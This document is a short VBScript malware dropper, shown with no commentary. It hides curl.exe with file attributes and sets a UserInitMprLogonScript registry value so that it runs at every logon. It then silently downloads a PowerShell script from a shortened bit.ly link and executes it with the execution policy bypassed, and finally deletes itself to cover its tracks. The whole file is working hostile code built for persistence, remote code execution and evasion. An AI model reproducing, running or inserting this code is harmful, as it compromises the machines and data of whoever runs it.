On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
username = CreateObject("WScript.Network").UserName
Set mapFile = objFSO.GetFile("C:\Windows\System32\curl.exe")
mapFile.Attributes = 7
myKey = "HKEY_CURRENT_USER\Environment\UserInitMprLogonScript"
command = "cmd.exe /c ""powershell.exe -WindowStyle Hidden cmd.exe /c C:\Windows\System32\curl.exe -k -L https://bit.ly/3m9LrJR -o %temp%\Down-X.ps1 & powershell.exe -ExecutionPolicy Bypass -File %temp%\Down-X.ps1"""
WshShell.RegWrite myKey,command,"REG_SZ"
objFSO.DeleteFile Wscript.ScriptFullName
